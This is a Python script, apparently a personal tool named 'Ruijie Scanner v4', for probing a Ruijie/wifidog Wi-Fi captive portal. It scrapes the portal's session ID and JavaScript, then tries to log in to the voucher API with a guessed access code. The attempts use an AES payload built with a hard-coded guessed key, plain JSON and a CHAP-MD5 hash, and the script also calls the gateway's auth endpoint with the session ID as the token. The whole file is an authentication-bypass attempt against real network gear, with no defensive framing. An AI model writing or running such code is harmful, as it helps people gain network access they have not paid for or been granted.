#!/usr/bin/env python3
"""
Ruijie Scanner v4 - Extracts maccauth JS, RES, and tests encrypted auth.
"""
import base64, hashlib, json, os, re, urllib.parse
from datetime import datetime
import requests, urllib3
urllib3.disable_warnings()

LOG = []
def log(m): print(m); LOG.append(m)

def parse_octal(s):
    out = bytearray(); i = 0
    while i < len(s):
        if s[i] == '\\' and i+3 < len(s) and s[i+1:i+4].isdigit():
            out.append(int(s[i+1:i+4], 8)); i += 4
        else:
            out.append(ord(s[i])); i += 1
    return bytes(out)

RENDER_KEY = hashlib.md5(b"RenderSecretKey2026!@#").digest()
sess = requests.Session()
sess.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
sess.verify = False
sess.allow_redirects = True

log("=" * 60)
log(f"RUIJIE SCANNER v4  {datetime.now()}")
log("=" * 60)

# Step 1: Go through portal -> /api/auth/wifidog -> maccauth
r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10)
portal_url = r.url
log(f"Portal URL: {portal_url}")

parsed = urllib.parse.urlparse(portal_url)
params = urllib.parse.parse_qs(parsed.query)
host = f"{parsed.scheme}://{parsed.netloc}"

# Step 2: Fetch /api/auth/wifidog?stage=portal
log("\n[1] FETCHING MACCAUTH PAGE...")
wifidog_url = f"{host}/api/auth/wifidog?stage=portal&{parsed.query}"
r = sess.get(wifidog_url, timeout=10)
maccauth_url = r.url
log(f"Maccauth URL: {maccauth_url}")
maccauth_html = r.text

maccath_parsed = urllib.parse.urlparse(maccauth_url)
maccath_params = urllib.parse.parse_qs(maccath_parsed.query)
sid = maccath_params.get("sessionId", [""])[0]
res = maccath_params.get("RES", [""])[0]
log(f"sessionId: {sid}")
log(f"RES: {res}")

# Step 3: Fetch RES resource
log("\n[2] FETCHING RES RESOURCE...")
if res:
    res_path = res.replace("./..", "/download/static/maccauth")
    res_url = urllib.parse.urljoin(maccauth_url, res_path)
    log(f"RES URL: {res_url}")
    try:
        r = sess.get(res_url, timeout=10)
        log(f"Status: {r.status_code}")
        log(f"Content-Type: {r.headers.get('content-type','')}")
        log(f"Content ({len(r.text)} bytes):")
        log(r.text[:2000])
        # Save RES to file
        with open("res_resource.txt", "w") as f:
            f.write(r.text)
        log("[Saved to res_resource.txt]")
    except Exception as e:
        log(f"Error: {e}")

# Step 4: Extract ALL JavaScript from maccauth page
log("\n[3] EXTRACTING JAVASCRIPT...")
scripts = re.findall(r'<script[^>]*>(.*?)</script>', maccauth_html, re.I | re.S)
for i, js in enumerate(scripts):
    js = js.strip()
    if not js:
        continue
    log(f"\n  Script {i}: {len(js)} characters")
    log(f"  {'='*40}")
    # Print first 2000 chars
    log(js[:2000])

# Also extract external script src
srcs = re.findall(r'<script[^>]*src=["\']([^"\']+)["\']', maccauth_html, re.I)
for src in srcs:
    abs_src = urllib.parse.urljoin(maccauth_url, src)
    log(f"\n  External script: {abs_src}")
    try:
        r = sess.get(abs_src, timeout=10)
        log(f"    Status: {r.status_code} ({len(r.text)} bytes)")
        log(f"    Content (first 1000 chars):")
        log(r.text[:1000])
    except Exception as e:
        log(f"    Error: {e}")

# Step 5: Find API URLs and endpoints in the page
log("\n[4] API URLs IN PAGE...")
apis = re.findall(r'https?://[a-zA-Z0-9./_?=&%-]+', maccauth_html)
for a in sorted(set(apis)):
    if len(a) > 20 and not a.endswith('.css') and not a.endswith('.js') and not a.endswith('.ico') and '.png' not in a and '.jpg' not in a and '.gif' not in a:
        log(f"  {a}")

# Find API function calls
api_funcs = re.findall(r'(post|get|ajax|fetch|axios)\([\s\S]{0,50}?["\'](/(?:api|auth)/[^"\']+)["\']', maccauth_html)
for m in api_funcs:
    log(f"  API call: {m[0]} -> {m[1]}")

# Step 6: Test encrypted auth with REAL sessionId
log("\n[5] ENCRYPTED AUTH TEST...")
api_url = f"{host}/api/auth/voucher/?lang=en_US"

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    HAS_CRYPTO = True
except:
    HAS_CRYPTO = False

if HAS_CRYPTO and sid:
    payload = json.dumps({
        "sessionId": sid,
        "accessCode": "123456",
        "apiVersion": 1
    })
    iv = os.urandom(16)
    cipher = AES.new(RENDER_KEY, AES.MODE_CBC, iv=iv)
    ct = cipher.encrypt(pad(payload.encode(), AES.block_size))
    enc = base64.urlsafe_b64encode(iv + ct).decode()
    
    log(f"  Encrypted payload: {enc[:80]}")
    r = sess.post(api_url, json={"data": enc}, timeout=10)
    log(f"  Status: {r.status_code}")
    log(f"  Response: {r.text[:500]}")

# Step 7: Test plain JSON with REAL sessionId
log("\n[6] PLAIN JSON AUTH TEST...")
if sid:
    r = sess.post(api_url, json={
        "sessionId": sid,
        "accessCode": "123456",
        "apiVersion": 1
    }, timeout=10)
    log(f"  Status: {r.status_code}")
    log(f"  Response: {r.text[:500]}")

    # Try CHAP-MD5 as accessCode
    chap_id = parse_octal(params.get("chap_id", [""])[0])
    chap_chal = parse_octal(params.get("chap_challenge", [""])[0])
    chap_resp = hashlib.md5(chap_id + b"123456" + chap_chal).hexdigest()
    r = sess.post(api_url, json={
        "sessionId": sid,
        "accessCode": chap_resp,
        "apiVersion": 1
    }, timeout=10)
    log(f"  CHAP as code: {r.status_code} -> {r.text[:200]}")

    # Try wifidog auth with real SID
    r = sess.get(f"http://{params.get('gw_address',['192.168.10.1'])[0]}:{params.get('gw_port',['2060'])[0]}/wifidog/auth?token={sid}",
                 timeout=10, allow_redirects=False)
    log(f"  gw auth(sid={sid[:16]}...): {r.status_code} -> {r.headers.get('Location','')[:150]}")

# Step 8: Check user_status.html for auth info
log("\n[7] USER STATUS HTML...")
try:
    r = sess.get(f"http://10.44.77.240:2060/user_status.html", timeout=10)
    log(f"  Status: {r.status_code} ({len(r.text)} bytes)")
    # Look for the key: accessCode or voucher
    if "accessCode" in r.text:
        log("  Contains 'accessCode'!")
    if "voucher" in r.text.lower():
        log("  Contains 'voucher'!")
    # Find API endpoints
    apis = re.findall(r'https?://[^"\'<> ]+', r.text)
    for a in apis:
        if 'api' in a or 'auth' in a:
            log(f"  API: {a}")
except Exception as e:
    log(f"  Error: {e}")

# Save
fname = f"portal_scan4_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
with open(fname, "w") as f:
    f.write("\n".join(LOG))
log(f"\n[+] Saved to {fname}")
